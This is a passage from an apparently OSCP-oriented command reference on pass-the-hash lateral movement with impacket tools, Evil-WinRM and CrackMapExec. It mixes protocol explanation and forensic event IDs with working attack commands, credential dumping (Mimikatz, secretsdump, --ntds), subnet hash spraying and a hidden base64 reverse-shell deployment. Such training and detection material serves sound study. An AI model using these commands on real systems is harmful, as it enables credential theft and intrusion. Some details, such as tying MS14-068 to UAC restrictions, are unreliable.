Logon Type 9 (NewCredentials) when using /run
- Event ID 4648:
Explicit credential logon attempt
- Mimikatz execution leaves traces in memory and logs","high"
"pth-impacket-psexec","Pass-the-Hash - Impacket PSExec","active-directory","impacket-psexec -hashes :<NTLM_HASH> <USER>@<TARGET>","Authenticate to remote Windows using NTLM hash with impacket-psexec from Kali","lateral-movement","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH IMPACKET PSEXEC:
WHAT IS PASS-THE-HASH:
Lateral movement technique leveraging NTLM authentication's acceptance of password hashes instead of plaintext passwords.

The vulnerability is unauthorized access to stored hashes, not a flaw in NTLM protocol itself.

FOUR PREREQUISITES (FROM TRAINING):
1.

Valid NTLM hash from compromised user

2.

SMB connection available (port 445)

3.

File and Printer Sharing enabled on target (default on Windows Server)

4.

User must be member of local Administrators group on target

PROTOCOL MECHANICS:
NTLM authentication challenge-response protocol:
1.

Client requests authentication to server

2.

Server sends 8-byte random challenge

3.

Client encrypts challenge with NTLM hash (hash used directly, not password)

4.

Server verifies encrypted response

5.

Authentication succeeds if response matches expected value

Hash never crosses network in plaintext - encrypted challenge-response proves hash possession.

IMPACKET PSEXEC IMPLEMENTATION:
Impacket's psexec.py replicates Sysinternals PsExec behavior:
1.

Authenticates via SMB using NTLM hash (via -hashes flag)

2.

Uploads service executable to ADMIN$ share

3.

Creates Windows service via Service Control Manager (RPC)

4.

Service spawns cmd.exe and redirects I/O over named pipe

5.

Interactive shell established

HASH FORMAT (CRITICAL):
- Impacket uses:
  -hashes :NTLM_HASH (colon prefix, NTLM only)

- Example:
  -hashes :2892D26CDF84D7A70E2EB3B9F05C425E

- LM:NTLM format:
  -hashes LM_HASH:NTLM_HASH (only needed for ancient systems)

- Most modern Windows systems:
NTLM hash sufficient, LM disabled

2014 UAC REMOTE RESTRICTIONS (MS14-068 CRITICAL):
Microsoft patch blocks PTH for local administrator accounts EXCEPT RID 500:
- RID 500 Administrator (built-in):
PTH works normally
- Other local admin accounts:
PTH authentication BLOCKED by UAC filtering
- Domain users with local admin rights:
PTH works (bypass UAC restrictions)

Training scenario uses 'Administrator' account (RID 500) which bypasses restriction.

OBTAINING NTLM HASHES:
From Kali:
- secretsdump.py DOMAIN/USER:PASSWORD@TARGET (remote SAM/LSA dump)
- crackmapexec smb TARGET -u USER -p PASS --sam (local SAM)
- crackmapexec smb TARGET -u USER -p PASS --lsa (LSA secrets)

From Windows:
- Mimikatz:
sekurlsa::logonpasswords (from LSASS memory)
- Mimikatz:
lsadump::sam (from SAM registry hive)
- reg save HKLM\SAM sam.save (manual registry extraction)

HASH FORMAT IN DUMPS:
Secretsdump output:
  USERNAME:RID:LM_HASH:NTLM_HASH:::
Example:
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E:::
Use 4th field (NTLM_HASH after 3rd colon).

PORT REQUIREMENTS:
- TCP 445:
SMB (primary protocol for file access and authentication)
- TCP 139:
NetBIOS (legacy, usually not required on modern systems)
- Dynamic high ports:
For service creation via RPC

EXECUTION CONTEXT:
PsExec spawns shell as SYSTEM (not as authenticated user):
- Authentication happens as <USER> (with hash)
- Service runs as Local System account
- Full privileges on target machine
- whoami shows 'nt authority\system'

COMPARISON TO OTHER TOOLS:
- PSExec:
  SYSTEM shell, service creation (noisy), uploads binary

- WMIExec:
  User-level shell, fileless, stealthier but slower

- SMBExec:
  Semi-interactive, fileless, creates/deletes batch files

- Evil-WinRM:
  Interactive PowerShell, best for post-exploitation

VERIFICATION BEFORE EXPLOITATION:
Always test hash validity first (saves exam time):
  crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E

Look for '[+] DOMAIN\Administrator:HASH (Pwn3d!)' - indicates admin access.

Time:
1-2 minutes for connection establishment and shell spawn

EXAM STRATEGY:
1.

Obtain hashes via secretsdump or Mimikatz

2.

Verify hash with crackmapexec BEFORE attempting psexec

3.

If authentication fails, verify user is RID 500 or domain user

4.

If psexec fails but hash valid, try wmiexec or smbexec

5.

Once shell obtained, immediately dump more credentials for lateral movement

COMMON FAILURES:
- STATUS_LOGON_FAILURE:
  Hash invalid, username wrong, or account disabled

- STATUS_ACCESS_DENIED:
  User not local admin (test with crackmapexec)

- UAC restriction:
  Local admin blocked (switch to domain user or RID 500)

- Connection timeout:
  Firewall blocking port 445

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon via NTLM)
- Event ID 4672:
Special privileges assigned to new logon (admin)
- Event ID 7045:
Service installed (PSEXESVC)
- Event ID 5140:
Network share accessed (ADMIN$)
- Service creation logs:
PSEXESVC.exe in System event logs","high"
"pth-impacket-wmiexec","Pass-the-Hash - Impacket WMIExec","active-directory","impacket-wmiexec -hashes :<NTLM_HASH> <USER>@<TARGET>","Semi-interactive shell via WMI using NTLM hash from Kali","lateral-movement","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH IMPACKET WMIEXEC:
TRAINING EXAMPLE (EXACT COMMAND FROM OSCP MODULE):
From Kali, performing pass-the-hash to FILES04 (192.168.50.73):
```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

Output showed successful lateral movement:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>
```

Commands executed successfully:
- hostname returned:
FILES04
- whoami returned:
files04\administrator

This demonstrated successful pass-the-hash lateral movement from Kali to Windows target using only NTLM hash.

WHAT IS PASS-THE-HASH VIA WMI:
Fileless lateral movement technique using Windows Management Instrumentation for remote process creation, authenticated with NTLM hash instead of password.

THREE PREREQUISITES (FROM TRAINING):
1.

Valid NTLM hash from compromised user
2.

SMB (port 445) and RPC (port 135) accessible on target
3.

User must have local administrator privileges

WHY USE WMIEXEC OVER PSEXEC:
- NO service creation (PSExec creates PSEXESVC service - Event ID 7045)
- NO binary written to disk (PSExec uploads executable to ADMIN$)
- Fileless execution = stealthier, better for AV/EDR evasion
- Leaves fewer forensic artifacts

TRADEOFF:
WMIExec is SLOWER than PSExec because:
- Each command spawns new process via Win32_Process.Create
- Output retrieved via temporary SMB share (not persistent named pipe)
- No persistent shell process (semi-interactive only)

HOW WMIEXEC WORKS (TECHNICAL BREAKDOWN):
1.

Authenticates to target via SMB using NTLM hash (-hashes :HASH)
2.

Connects to WMI service over RPC (port 135)
3.

For each command:
Calls Win32_Process.Create method
4.

Process executes with redirected output to ADMIN$ share temporary file
5.

Impacket retrieves output file via SMB
6.

Deletes temporary file
7.

Returns output to attacker

PROCESS CREATION METHOD:
WMI Win32_Process.Create:
```
PROCESS CALL ID:
1
C:\> cmd.exe /Q /c <COMMAND> 1> \\127.0.0.1\ADMIN$\__<TIMESTAMP> 2>&1
```
Output redirected to ADMIN$ share for retrieval.

PORT REQUIREMENTS:
- TCP 135:
RPC endpoint mapper (initial WMI connection)
- TCP 445:
SMB (authentication and output retrieval via ADMIN$)
- Ephemeral ports 49152-65535:
RPC session data (Windows Server 2008+)

HASH FORMAT:
- Impacket WMIExec:
-hashes :NTLM_HASH (colon prefix, NTLM only)
- Example:
-hashes :2892D26CDF84D7A70E2EB3B9F05C425E
- No LM hash needed for modern systems

EXECUTION CONTEXT:
WMIExec spawns processes as authenticated user (NOT SYSTEM like PSExec):
- Authentication:
Administrator (with NTLM hash)
- Process owner:
Administrator (not NT AUTHORITY\SYSTEM)
- whoami returns:
files04\administrator
- Privileges:
Admin rights via authenticated user context

2014 UAC REMOTE RESTRICTIONS (MS14-068):
- RID 500 Administrator:
PTH works (training uses this)
- Other local admins:
PTH blocked by UAC filtering
- Domain users with local admin:
PTH works (bypass UAC)

TRAINING CONTEXT:
Scenario involved:
- Attacker on Kali Linux
- Administrator NTLM hash obtained via previous compromise
- Target:
FILES04 (192.168.50.73) - Windows Server
- Goal:
Lateral movement without alerting security tools

COMPARISON TO OTHER IMPACKET TOOLS:
- PSExec:
SYSTEM shell, service creation (noisy), faster, uploads binary
- WMIExec:
User shell, fileless, stealthier, slower, no service
- SMBExec:
User shell, fileless, batch files, slower
- SecretsDump:
Credential extraction only (no shell)

VERIFICATION BEFORE EXPLOITATION:
Test hash validity first:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Look for:
[+] DOMAIN\Administrator:HASH (Pwn3d!)

SEMI-INTERACTIVE SHELL BEHAVIOR:
- Not a true interactive shell (like SSH/RDP)
- Each command executed independently
- No persistent environment variables between commands
- No tab completion or command history
- Cannot run interactive programs (no stdin piping)

MANUAL ALTERNATIVE:
From PowerShell on compromised Windows host:
```powershell
$username = 'Administrator'
$password = 'Password123!' # In reality, would use hash
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ""calc"" -ComputerName 192.168.50.73 -Credential $credential
```
(Note:
PowerShell doesn't natively support hash-based auth - requires Mimikatz injection)

TIME ESTIMATE:
- Connection:
30 seconds
- Per command:
2-5 seconds (slower than PSExec)
- Total for basic enumeration:
2-3 minutes

EXAM STRATEGY:
1.

Use WMIExec when stealth is priority (AV/EDR present)
2.

Use PSExec when speed is priority (stable environments)
3.

Always verify hash with crackmapexec first
4.

If WMI fails, try PSExec or SMBExec with same hash
5.

For complex tasks, consider upgrading to reverse shell

COMMON FAILURES:
- STATUS_LOGON_FAILURE:
Invalid hash or username
- RPC unavailable:
Port 135 blocked by firewall
- ACCESS_DENIED:
User not local admin
- Slow execution:
Expected - each command spawns new process

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon via NTLM)
- Event ID 4672:
Special privileges assigned (admin logon)
- WMI Event ID 5857-5861:
WMI activity logs
- No service creation events (unlike PSExec)
- Process creation:
Event ID 4688 for spawned processes
- ADMIN$ access:
Event ID 5140 (network share access)","high"
"pth-impacket-smbexec","Pass-the-Hash - Impacket SMBExec","active-directory","impacket-smbexec -hashes :<NTLM_HASH> <USER>@<TARGET>","Fileless shell via SMB using NTLM hash from Kali","lateral-movement","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH IMPACKET SMBEXEC:
WHAT IS SMBEXEC:
Fileless lateral movement tool providing semi-interactive shell via SMB, using NTLM hash for authentication.

Alternative to PSExec that doesn't persistently write binaries to disk.

THREE PREREQUISITES:
1.

Valid NTLM hash from compromised user  
2.

SMB access (port 445) to target
3.

User must be local administrator on target
4.

ADMIN$ share must be accessible

WHY USE SMBEXEC:
- FILELESS execution (no persistent binary like PSExec)
- More stealthy than PSExec (no service creation)
- Good alternative when PSExec detected/blocked
- Cleaner than WMIExec for command execution

HOW SMBEXEC WORKS (TECHNICAL BREAKDOWN):
1.

Authenticates to target via SMB using NTLM hash
2.

For each command:
   a.

Creates temporary batch file (.bat) in ADMIN$ share
   b.

Creates Windows service to execute batch file
   c.

Batch file runs command and redirects output to ADMIN$
   d.

SMBExec retrieves output via SMB
   e.

Deletes batch file and service
3.

Result:
Semi-interactive shell without persistent artifacts

BATCH FILE CREATION:
Example batch file created per command:
```batch
@echo off
cmd.exe /Q /c <COMMAND> 1> \\127.0.0.1\ADMIN$\__output 2>&1
```
File written to:
\\TARGET\ADMIN$\execute.bat

SERVICE CREATION:
Temporary service created via Service Control Manager:
- Service name:
Random (e.g., BTOBTO)
- Binary path:
cmd.exe /c \\127.0.0.1\ADMIN$\execute.bat
- Started immediately
- Deleted after execution

COMPARISON TO OTHER TOOLS:
- PSExec:
Persistent service (PSEXESVC), binary uploaded, SYSTEM shell, faster
- SMBExec:
Temporary service, batch files only, user shell, stealthier
- WMIExec:
No service, pure WMI, fileless, slower
- Evil-WinRM:
WinRM protocol, interactive PowerShell, different ports

FILELESS ADVANTAGE:
No persistent executable written to disk:
- PSExec uploads psexesvc.exe (detectable by AV)
- SMBExec uses native cmd.exe (already on system)
- Only temporary .bat files (deleted after execution)
- Harder for forensics to detect

HASH FORMAT:
- Impacket:
-hashes :NTLM_HASH (colon prefix)
- Example:
-hashes :2892D26CDF84D7A70E2EB3B9F05C425E
- No LM hash needed for modern systems

EXECUTION CONTEXT:
SMBExec spawns processes as authenticated user:
- Authentication:
Specified user (with NTLM hash)
- Process owner:
Same user (not SYSTEM)
- whoami returns:
domain\username or computername\username
- Service runs in user context

2014 UAC REMOTE RESTRICTIONS:
- RID 500 Administrator:
PTH works
- Other local admins:
PTH blocked by UAC
- Domain users with local admin:
PTH works

PORT REQUIREMENTS:
- TCP 445:
SMB (authentication and file operations)
- TCP 139:
NetBIOS (legacy, usually not required)
- Dynamic ports:
Service Control Manager (RPC)

SEMI-INTERACTIVE BEHAVIOR:
- Each command executed independently
- No persistent shell process
- No environment variable persistence
- Slower than PSExec (batch file creation overhead)

MODE OPTIONS:
- SHARE mode (default):
Uses ADMIN$ share for batch files
- SERVER mode:
Creates temporary SMB server for output retrieval

VERIFICATION:
Test hash before exploitation:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Look for:
(Pwn3d!)

TIME ESTIMATE:
- Connection:
30-60 seconds
- Per command:
2-4 seconds (batch creation + execution + cleanup)
- Total for enumeration:
2-4 minutes

EXAM STRATEGY:
1.

Use SMBExec when stealth is priority
2.

Use PSExec when speed is priority
3.

Use WMIExec when service creation must be avoided
4.

Try all three if one fails - same hash, different method

COMMON FAILURES:
- STATUS_LOGON_FAILURE:
Invalid hash or username
- STATUS_OBJECT_NAME_NOT_FOUND:
ADMIN$ not accessible
- ACCESS_DENIED:
User not local admin
- Slower execution:
Expected - overhead of batch file operations

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon)
- Event ID 7045:
Service installed (temporary service)
- Event ID 4688:
Process creation (cmd.exe executing batch)
- Event ID 5140:
ADMIN$ share accessed
- Batch file traces in ADMIN$ (if not cleaned up properly)
- Service creation/deletion logs in System event log","high"
"pth-evil-winrm","Pass-the-Hash - Evil-WinRM","active-directory","evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>","Interactive PowerShell remoting via WinRM using NTLM hash from Kali","lateral-movement","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH EVIL-WINRM:
WHAT IS EVIL-WINRM:
Ruby-based WinRM client supporting pass-the-hash authentication for interactive PowerShell remoting from Kali.

Provides rich post-exploitation features including file upload/download and in-memory script execution.

THREE PREREQUISITES:
1.

Valid NTLM hash from compromised user
2.

WinRM enabled on target (port 5985 HTTP or 5986 HTTPS)
3.

User must be member of Remote Management Users OR Administrators group

WINRM GROUP MEMBERSHIP REQUIREMENT:
From OSCP training, for WinRM authentication to work:
- User must be part of 'Administrators' group, OR
- User must be part of 'Remote Management Users' group on target host

This is WinRM-specific requirement (different from PSExec/WMI which only need Administrators).

WHY USE EVIL-WINRM:
- Interactive PowerShell shell (better than semi-interactive Impacket tools)
- Built-in file transfer:
upload/download commands
- In-memory script execution:
No disk writes for scripts
- Menu system for common tasks
- PowerShell script loading:
Invoke-Mimikatz, PowerView, etc.
- User-friendly interface with tab completion

PROTOCOL:
WS-MANAGEMENT (WinRM):
- Port 5985:
HTTP (unencrypted)
- Port 5986:
HTTPS (encrypted with SSL/TLS)
- Microsoft's implementation of WS-Management open standard
- Designed for legitimate remote administration

HASH FORMAT (CRITICAL DIFFERENCE):
Evil-WinRM uses DIFFERENT format than Impacket:
- Evil-WinRM:
-H NTLM_HASH (no colon prefix)
- Impacket:
-hashes :NTLM_HASH (colon prefix)

Examples:
```bash
# Evil-WinRM (NO colon)
evil-winrm -i 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E

# Impacket (colon prefix)
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

WINRM AUTHENTICATION:
WinRM supports multiple authentication methods:
- Basic:
Username + password (plaintext over HTTPS)
- NTLM:
Challenge-response with hash (Evil-WinRM uses this for PTH)
- Kerberos:
Ticket-based (requires hostname, not IP)
- CredSSP:
Credential delegation

For Pass-the-Hash, Evil-WinRM uses NTLM authentication where hash is used directly in challenge-response protocol.

INTERACTIVE POWERSHELL SHELL:
Evil-WinRM provides full interactive PowerShell:
- Persistent environment variables
- Tab completion
- Command history
- Multi-line commands
- PowerShell modules available
- Runs in user context (not SYSTEM)

EXECUTION CONTEXT:
- Authentication:
Specified user (with NTLM hash)
- Process owner:
Same user
- whoami returns:
domain\username or computername\username
- PowerShell version:
Target's installed version (5.1 typically)

BUILT-IN FEATURES:
File transfer:
```
*Evil-WinRM* PS> upload /local/path/file.exe C:\Windows\Temp\file.exe
*Evil-WinRM* PS> download C:\Users\admin\Desktop\flag.txt /home/kali/flag.txt
```

Script loading (in-memory):
```
*Evil-WinRM* PS> Invoke-Binary /path/to/Invoke-Mimikatz.ps1
*Evil-WinRM* PS> Invoke-Mimikatz
```

Menu system:
```
*Evil-WinRM* PS> menu
```
Provides shortcuts for common tasks.

2014 UAC REMOTE RESTRICTIONS:
- RID 500 Administrator:
PTH works
- Other local admins:
PTH blocked by UAC (unless Remote Management Users)
- Domain users with proper group membership:
PTH works

COMPARISON TO OTHER TOOLS:
- PSExec:
SYSTEM shell, service creation, faster but noisier
- WMIExec:
Semi-interactive, fileless, slower
- SMBExec:
Semi-interactive, batch files, stealthy
- Evil-WinRM:
Interactive PowerShell, best UX, WinRM-specific

WinRM advantage:
Different protocol (not SMB) - may work when SMB blocked.

VERIFICATION:
Test WinRM availability and hash:
```bash
# Check WinRM ports
nmap -p 5985,5986 -Pn -v 192.168.50.73

# Test hash
crackmapexec winrm 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```

SSL/TLS SUPPORT:
For HTTPS (port 5986):
```bash
evil-winrm -i 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E -S
```
-S flag enables SSL (port 5986).

Note:
Self-signed certificates common - Evil-WinRM accepts by default.

OBTAINING HASHES:
- secretsdump.py:
Remote SAM/LSA dump from Kali
- Mimikatz:
sekurlsa::logonpasswords on Windows
- crackmapexec:
--sam or --lsa flags

TIME ESTIMATE:
- Connection:
30-60 seconds
- Interactive session:
As long as needed
- File transfers:
Depends on size (typically fast)

EXAM STRATEGY:
1.

Use Evil-WinRM for interactive post-exploitation when WinRM available
2.

Preferred over PSExec for user-friendly PowerShell environment
3.

Excellent for running PowerShell enumeration scripts (PowerUp, PowerView)
4.

Built-in upload/download saves time vs manual file transfer
5.

If connection fails, verify WinRM ports open and user in correct group

COMMON FAILURES:
- Authorization error:
User not in Administrators or Remote Management Users
- Network unreachable:
WinRM not enabled or firewall blocking ports
- Hash format error:
Remove colon prefix (use -H NTLM not -H :NTLM)
- SSL error:
Certificate issue - try without -S (use HTTP port 5985)

MANUAL ALTERNATIVE:
From compromised Windows host with PowerShell:
```powershell
$username = 'Administrator'
$password = 'Password123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force  
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
$session = New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession $session
```
(Note:
PowerShell doesn't natively support hash-based auth - requires Mimikatz for PTH)

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon via WinRM)
- Event ID 4672:
Special privileges assigned
- WinRM logs:
Event IDs 6-169 (WinRM activity)
- PowerShell logging:
Event ID 4104 (script block logging if enabled)
- Event ID 5156:
Windows Filtering Platform connections (port 5985/5986)","high"
"pth-cme-spray","Pass-the-Hash - CrackMapExec Spray","active-directory","crackmapexec smb <TARGET_RANGE> -u <USER> -H <NTLM_HASH>","Spray NTLM hash across multiple targets to find where it works","lateral-movement","OSCP TRAINING MATERIAL - PASS-THE-HASH SPRAYING WITH CRACKMAPEXEC:
WHAT IS PTH SPRAYING:
Rapidly testing a single NTLM hash across multiple targets to identify all systems where the compromised credential grants administrative access.

Efficient technique for discovering credential reuse.

WHY SPRAY HASHES:
- Same local administrator password often reused across multiple machines
- Domain admin hash works on all domain-joined systems
- Quick way to identify lateral movement opportunities
- Faster than testing each system individually

CRACKMAPEXEC (CME) ADVANTAGES:
- Multi-threaded:
Tests many hosts simultaneously
- CIDR support:
192.168.50.0/24 tests entire subnet
- Clear indicators:
[+] Pwn3d! shows admin access
- Protocol flexibility:
SMB, WinRM, MSSQL, SSH
- Built-in post-exploitation:
--sam, --lsa, -x, -X

PWNED INDICATOR:
```
SMB    192.168.50.73    445    FILES04    [+] CORP\Administrator:2892...

(Pwn3d!)
```
(Pwn3d!) = Hash grants local administrator access on this system.

No (Pwn3d!) but [+] = Valid credentials but not admin:
```
SMB    192.168.50.75    445    WEB01      [+] CORP\jen:369def...
```
Authentication succeeded but user lacks admin privileges.

THREE PREREQUISITES:
1.

Valid NTLM hash from compromised user
2.

SMB port 445 accessible on targets
3.

No network segmentation blocking attacker → targets

2014 UAC REMOTE RESTRICTIONS (CRITICAL):
- RID 500 Administrator hash:
Works across all systems
- Other local admin hashes:
BLOCKED by UAC on Windows 7+ (except domain accounts)
- Domain user hashes:
Work if user is local admin on target

This is why training scenarios typically use:
- Built-in Administrator account (RID 500), OR
- Domain user accounts with local admin rights

HASH FORMAT:
- CrackMapExec:
-H NTLM_HASH (no colon prefix)
- Example:
-H 2892D26CDF84D7A70E2EB3B9F05C425E
- Accepts 32 hex characters

TARGET SPECIFICATION:
Multiple formats supported:
- Single IP:
192.168.50.73
- IP range:
192.168.50.1-192.168.50.254
- CIDR notation:
192.168.50.0/24
- Hostname:
files04.corp.com
- IP list file:
-t targets.txt

EXECUTION WORKFLOW:
1.

CME connects to each target via SMB (port 445)
2.

Attempts NTLM authentication with provided hash
3.

Tests if authenticated user has admin privileges
4.

Displays result:
[+] or [-] with (Pwn3d!) if admin
5.

Continues to next target

SPEED AND THREADING:
- Default threads:
Automatic (typically 100)
- Custom threads:
--threads 50
- /24 subnet:
1-2 minutes typical
- /16 subnet:
10-20 minutes (6553 6 hosts)

COMMON USE CASES:
Scenario 1:
Local admin password reuse
```bash
crackmapexec smb 192.168.50.0/24 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Finds all systems using same local Administrator password.

Scenario 2:
Domain user with local admin rights
```bash
crackmapexec smb 192.168.50.0/24 -u jen -H 369def79d8372408bf6e93364cc93075 -d corp.com
```
Finds all systems where jen is local admin.

Scenario 3:
Domain admin access
```bash
crackmapexec smb 192.168.50.0/24 -u admin_da -H <HASH> -d corp.com
```
Domain admin hash typically works on ALL domain-joined systems.

LOCAL VS DOMAIN AUTHENTICATION:
- Default:
Domain authentication (if domain detected)
- Force local:
--local-auth flag
- Explicit domain:
-d corp.com

AUTHENTICATION ONLY (NO EXPLOITATION):
CME spray tests authentication without executing commands:
- Fast:
No command execution overhead
- Stealthy:
Minimal Event Log entries
- Safe:
Doesn't trigger command execution alerts

POST-EXPLOITATION OPTIONS:
After identifying pwned systems:
```bash
# Execute command on all pwned hosts
crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> -x whoami

# Dump SAM hashes from all pwned hosts  
crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> --sam

# Dump LSA secrets
crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> --lsa
```

OUTPUT INTERPRETATION:
```
[+] Successful authentication
[-] Failed authentication
[*] Informational message
(Pwn3d!) Local administrator access confirmed
```

VERIFICATION:
Before spraying, test hash on known target:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Confirm [+] before spraying subnet.

TIME ESTIMATE:
- /24 subnet (254 hosts):
1-2 minutes
- Single host verification:
<10 seconds
- /16 subnet:
Not recommended for exam (too slow)

EXAM STRATEGY:
1.

Obtain hash via secretsdump/Mimikatz
2.

Verify hash on source system
3.

Spray across lab subnet to find reuse
4.

Prioritize high-value targets from results
5.

Use --sam to extract more hashes from pwned systems
6.

Repeat spray with newly obtained hashes

COMMON FAILURES:
- Many [-] expected:
Hash won't work everywhere
- Timeout errors:
Increase --timeout 5
- No Pwn3d found:
Try --local-auth or different hash
- Connection refused:
Firewall blocking port 445

FORENSIC ARTIFACTS (PER TARGET):
- Event ID 4624:
Logon Type 3 (Network logon attempt)
- Event ID 4625:
Failed logon (if hash invalid on that system)
- Event ID 4672:
Special privileges (if admin access)
- Minimal footprint compared to command execution

DIFFERENCE FROM PASSWORD SPRAYING:
- Password spray:
One password, many users (horizontal)
- Hash spray:
One hash, many systems (lateral)
- PTH spray finds where credential is reused across infrastructure","high"
"pth-cme-exec","Pass-the-Hash - CrackMapExec Execute","active-directory","crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH> -x '<COMMAND>'","Execute commands on remote system using NTLM hash with CrackMapExec","lateral-movement","OSCP TRAINING MATERIAL - PASS-THE-HASH COMMAND EXECUTION WITH CRACKMAPEXEC:
WHAT IS CME EXEC:
CrackMapExec wrapper combining pass-the-hash authentication with remote command execution in a single operation.

Efficient for quick enumeration and exploitation.

WHY USE CME EXEC:
- One-liner:
Authentication + command in single command
- Multiple execution methods:
Choose stealth vs speed
- Quick enumeration:
Faster than establishing full shell
- Mass execution:
Run same command on multiple targets
- Built-in credential dumping:
--sam, --lsa flags

THREE PREREQUISITES:
1.

Valid NTLM hash from compromised user
2.

SMB/WMI access to target (ports 445/135)
3.

User must be local administrator

EXECUTION METHODS:
CME supports multiple backend methods:
- wmiexec (default):
Uses WMI, fileless, stealthy, no service creation
- smbexec:
Uses SMB, batch files, fileless, temporary service
- atexec:
Uses Task Scheduler, scheduled task creation
- mmcexec:
Uses MMC20.Application COM object

Select method:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> -x whoami --exec-method wmiexec
```

COMMAND TYPES:
- -x 'COMMAND':
Execute cmd.exe command
- -X 'COMMAND':
Execute PowerShell command

Examples:
```bash
# CMD command
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> -x 'whoami'

# PowerShell command
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> -X 'Get-Process'
```

HASH FORMAT:
- CrackMapExec:
-H NTLM_HASH (no colon)
- Example:
-H 2892D26CDF84D7A70E2EB3B9F05C425E

2014 UAC REMOTE RESTRICTIONS:
- RID 500 Administrator:
Works
- Other local admins:
Blocked by UAC
- Domain users with local admin:
Works

COMMON ENUMERATION COMMANDS:
Quick wins for OSCP:
```bash
# System information
crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'systeminfo'

# Current user
crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'whoami /all'

# Network information
crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'ipconfig /all'

# Running processes
crackmapexec smb <TARGET> -u <USER> -H <HASH> -X 'Get-Process'

# Installed software
crackmapexec smb <TARGET> -u <USER> -H <HASH> -X 'Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'
```

CREDENTIAL DUMPING:
Built-in flags for credential extraction:
```bash
# Dump SAM hashes
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> --sam

# Dump LSA secrets
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> --lsa

# Dump NTDS.dit (Domain Controller)
crackmapexec smb 192.168.50.100 -u Administrator -H <HASH> --ntds
```

OUTPUT RETRIEVAL:
CME displays command output directly:
```
SMB    192.168.50.73    445    FILES04    [+] Executed command
SMB    192.168.50.73    445    FILES04    files04\administrator
```

NO OUTPUT OPTION:
For speed without output retrieval:
```bash
crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'command' --no-output
```
Useful for mass deployment (reverse shells, etc.).

MULTIPLE TARGETS:
Execute on multiple systems:
```bash
# CIDR range
crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> -x 'hostname'

# Target list
crackmapexec smb -t targets.txt -u Administrator -H <HASH> -x 'whoami'
```

COMPARISON TO OTHER TOOLS:
- impacket-psexec:
Interactive shell, SYSTEM context, slower
- impacket-wmiexec:
Semi-interactive shell, user context, fileless
- CME exec:
Single command, fast, multiple methods

When to use CME exec:
- Quick enumeration:
Get system info fast
- Testing access:
Verify hash works
- Mass deployment:
Deploy to multiple targets
- Credential dumping:
--sam/--lsa faster than manual

When to use full shell (PSExec/WMIExec):
- Interactive exploration needed
- Complex multi-step tasks
- Manual enumeration required
- File manipulation needed

REVERSE SHELL DEPLOYMENT:
CME can deploy reverse shells:
```bash
# PowerShell reverse shell (base64)
crackmapexec smb <TARGET> -u <USER> -H <HASH> -X 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'
```

Set up listener first:
```bash
nc -lvnp 443
```

EXECUTION METHOD COMPARISON:
wmiexec (default):
- Fileless, no service creation
- Slower per command
- Stealthy
- Recommended for exam

smbexec:
- Batch files, temporary service
- Faster than wmiexec
- More artifacts

atexec:
- Uses Task Scheduler
- Creates scheduled task
- Task visible in Task Scheduler
- Leaves Event ID 4698

VERIFICATION:
Test before exploitation:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Look for (Pwn3d!) before -x commands.

TIME ESTIMATE:
- Single command:
5-10 seconds
- Multiple targets:
1-2 minutes for /24
- Credential dumping (--sam):
10-30 seconds

EXAM STRATEGY:
1.

Verify hash with CME (no -x)
2.

Quick enumeration:
systeminfo, whoami, ipconfig
3.

Credential dumping:
--sam for local hashes
4.

If complex tasks needed, switch to PSExec/WMIExec full shell
5.

For mass deployment, use CME -x with reverse shell payload

COMMON FAILURES:
- Authentication failed:
Hash invalid or user not admin
- No output:
Try different --exec-method
- STATUS_ACCESS_DENIED:
User lacks admin privileges
- Execution method fails:
